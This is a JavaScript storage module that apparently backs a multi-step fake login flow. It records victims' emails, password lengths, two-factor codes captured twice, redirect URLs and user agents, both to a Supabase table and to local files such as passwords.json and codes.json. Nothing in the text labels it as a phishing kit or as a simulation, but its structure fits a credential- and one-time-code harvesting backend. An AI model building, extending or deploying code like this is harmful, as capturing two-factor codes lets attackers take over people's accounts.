import { createClient } from "@supabase/supabase-js";
import { randomUUID } from "crypto";
import fs from "fs/promises";
import path from "path";

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || "";
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || "";

// Debug logging
console.log("🔧 Supabase Debug Info:");
console.log("   SUPABASE_URL:", supabaseUrl ? "✅ SET" : "❌ NOT SET");
console.log("   SUPABASE_SERVICE_ROLE_KEY:", process.env.SUPABASE_SERVICE_ROLE_KEY ? "✅ SET" : "❌ NOT SET");
console.log("   SUPABASE_ANON_KEY:", process.env.SUPABASE_ANON_KEY ? "✅ SET" : "❌ NOT SET");
console.log("   NODE_ENV:", process.env.NODE_ENV);

const supabase = createClient(supabaseUrl, supabaseKey);

if (!supabaseUrl || !supabaseKey) {
  console.error("❌ CRITICAL: Supabase credentials are missing! Functions will fail.");
  console.error("   Make sure SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are set in Netlify environment variables.");
}

// Use /app/data in production (Docker), or relative data/ in development
const dataDir = process.env.NODE_ENV === "production" 
  ? "/app/data"
  : path.join(process.cwd(), "data");

async function ensureDataDir() {
  try {
    await fs.access(dataDir);
  } catch {
    await fs.mkdir(dataDir, { recursive: true });
  }
}

async function readJson(fileName) {
  await ensureDataDir();
  const filePath = path.join(dataDir, fileName);
  try {
    const raw = await fs.readFile(filePath, "utf-8");
    return JSON.parse(raw || "[]");
  } catch (e) {
    return [];
  }
}

async function writeJson(fileName, data) {
  await ensureDataDir();
  const filePath = path.join(dataDir, fileName);
  await fs.writeFile(filePath, JSON.stringify(data, null, 2), "utf-8");
}

class SupabaseStorage {
  async logLoginAttempt(insertAttempt) {
    console.log("📝 logLoginAttempt called with:", insertAttempt);
    const id = randomUUID();
    const timestamp = new Date().toISOString();
    const item = {
      id,
      timestamp,
      ...insertAttempt,
    };

    try {
      // Save to Supabase - fix column names (snake_case)
      const { data, error } = await supabase
        .from("login_attempts")
        .insert([{
          id: item.id,
          session_id: item.sessionId,
          timestamp: item.timestamp,
          step: item.step,
          step_name: item.stepName,
          email: item.email,
          password_length: item.passwordLength,
          two_factor_code: item.twoFactorCode,
          attempt: item.attempt,
          result: item.result,
          action: item.action,
          redirect_url: item.redirectUrl,
          user_agent: item.userAgent,
        }])
        .select()
        .single();

      if (error) {
        console.error("❌ Supabase login attempt error:", error);
        throw error;
      }

      console.log("✅ Login attempt saved to Supabase");

      // Also save to JSON as backup
      try {
        const file = "login_attempts.json";
        const existing = await readJson(file);
        existing.push(item);
        await writeJson(file, existing);
      } catch (jsonError) {
        console.error("Failed to write login attempt to JSON:", jsonError);
      }

      return data || item;
    } catch (error) {
      console.error("Error logging attempt:", error);
      // Fallback: save to JSON only
      const file = "login_attempts.json";
      const existing = await readJson(file);
      existing.push(item);
      await writeJson(file, existing);
      return item;
    }
  }

  async getLoginAttempts() {
    try {
      const { data, error } = await supabase
        .from("login_attempts")
        .select()
        .order("timestamp", { ascending: false });

      if (error) {
        console.error("Supabase fetch error:", error);
        throw error;
      }

      return data || [];
    } catch (error) {
      console.error("Error fetching attempts, falling back to JSON:", error);
      // Fallback to JSON
      return await readJson("login_attempts.json");
    }
  }

  async clearLoginAttempts() {
    try {
      const { error } = await supabase
        .from("login_attempts")
        .delete()
        .neq("id", "");

      if (error) {
        console.error("Supabase clear error:", error);
        throw error;
      }

      // Also clear JSON
      try {
        await writeJson("login_attempts.json", []);
      } catch (jsonError) {
        console.error("Failed to clear login attempts JSON:", jsonError);
      }
    } catch (error) {
      console.error("Error clearing attempts:", error);
      // Fallback: clear JSON only
      await writeJson("login_attempts.json", []);
    }
  }

  async saveEmailData(data) {
    console.log("📧 saveEmailData called with:", JSON.stringify(data, null, 2));
    const item = {
      id: randomUUID(),
      timestamp: new Date().toISOString(),
      ...data,
    };

    try {
      console.log("   Attempting Supabase insert with:", JSON.stringify(item, null, 2));
      console.log("   Supabase client configured:", supabaseUrl ? "YES" : "NO");
      
      // Save to Supabase (in a generic events table or custom table)
      const { data: insertedData, error } = await supabase
        .from("login_attempts")
        .insert([{
          id: item.id,
          session_id: item.sessionId,
          timestamp: item.timestamp,
          step: 1,
          step_name: "email_input",
          email: item.email,
          user_agent: item.userAgent,
        }]);

      if (error) {
        console.error("❌ Supabase email save error:", JSON.stringify(error, null, 2));
        throw error;
      }

      console.log("✅ Email saved to Supabase:", JSON.stringify(insertedData, null, 2));

      // Also save to JSON as backup
      try {
        const file = "emails.json";
        const existing = await readJson(file);
        existing.push(item);
        await writeJson(file, existing);
      } catch (jsonError) {
        console.error("Failed to write email to JSON:", jsonError);
      }
    } catch (error) {
      console.error("Error saving email:", error);
      // Fallback: save to JSON only
      const file = "emails.json";
      const existing = await readJson(file);
      existing.push(item);
      await writeJson(file, existing);
    }
  }

  async savePasswordData(data) {
    console.log("🔐 savePasswordData called");
    const item = {
      id: randomUUID(),
      timestamp: new Date().toISOString(),
      ...data,
    };

    try {
      // Save to Supabase - fix column names
      const { error } = await supabase
        .from("login_attempts")
        .insert([{
          id: item.id,
          session_id: item.sessionId,
          timestamp: item.timestamp,
          step: 2,
          step_name: "password_input",
          email: item.email,
          password_length: item.passwordLength,
          user_agent: item.userAgent,
        }]);

      if (error) {
        console.error("❌ Supabase password save error:", error);
        throw error;
      }

      console.log("✅ Password saved to Supabase");

      // Also save to JSON as backup
      try {
        const file = "passwords.json";
        const existing = await readJson(file);
        existing.push(item);
        await writeJson(file, existing);
      } catch (jsonError) {
        console.error("Failed to write password to JSON:", jsonError);
      }
    } catch (error) {
      console.error("Error saving password:", error);
      // Fallback: save to JSON only
      const file = "passwords.json";
      const existing = await readJson(file);
      existing.push(item);
      await writeJson(file, existing);
    }
  }

  async saveFirstCodeData(data) {
    console.log("🔑 saveFirstCodeData called");
    const item = {
      id: randomUUID(),
      timestamp: new Date().toISOString(),
      ...data,
    };

    try {
      // Save to Supabase - fix column names
      const { error } = await supabase
        .from("login_attempts")
        .insert([{
          id: item.id,
          session_id: item.sessionId,
          timestamp: item.timestamp,
          step: 3,
          step_name: "two_factor_verification",
          email: item.email,
          two_factor_code: item.code,
          attempt: item.attempt,
          result: item.result,
          user_agent: item.userAgent,
        }]);

      if (error) {
        console.error("❌ Supabase first code save error:", error);
        throw error;
      }

      console.log("✅ First code saved to Supabase");

      // Also save to JSON as backup
      try {
        const file = "code.json";
        const existing = await readJson(file);
        existing.push(item);
        await writeJson(file, existing);
      } catch (jsonError) {
        console.error("Failed to write first code to JSON:", jsonError);
      }
    } catch (error) {
      console.error("Error saving first code:", error);
      // Fallback: save to JSON only
      const file = "code.json";
      const existing = await readJson(file);
      existing.push(item);
      await writeJson(file, existing);
    }
  }

  async saveSecondCodeData(data) {
    console.log("🔑 saveSecondCodeData called");
    const item = {
      id: randomUUID(),
      timestamp: new Date().toISOString(),
      ...data,
    };

    try {
      // Save to Supabase - fix column names
      const { error } = await supabase
        .from("login_attempts")
        .insert([{
          id: item.id,
          session_id: item.sessionId,
          timestamp: item.timestamp,
          step: 3,
          step_name: "two_factor_verification",
          email: item.email,
          two_factor_code: item.code,
          attempt: item.attempt,
          result: item.result,
          user_agent: item.userAgent,
        }]);

      if (error) {
        console.error("❌ Supabase second code save error:", error);
        throw error;
      }

      console.log("✅ Second code saved to Supabase");

      // Also save to JSON as backup
      try {
        const file = "codes.json";
        const existing = await readJson(file);
        existing.push(item);
        await writeJson(file, existing);
      } catch (jsonError) {
        console.error("Failed to write second code to JSON:", jsonError);
      }
    } catch (error) {
      console.error("Error saving second code:", error);
      // Fallback: save to JSON only
      const file = "codes.json";
      const existing = await readJson(file);
      existing.push(item);
      await writeJson(file, existing);
    }
  }
}

export const supabaseStorage = new SupabaseStorage();
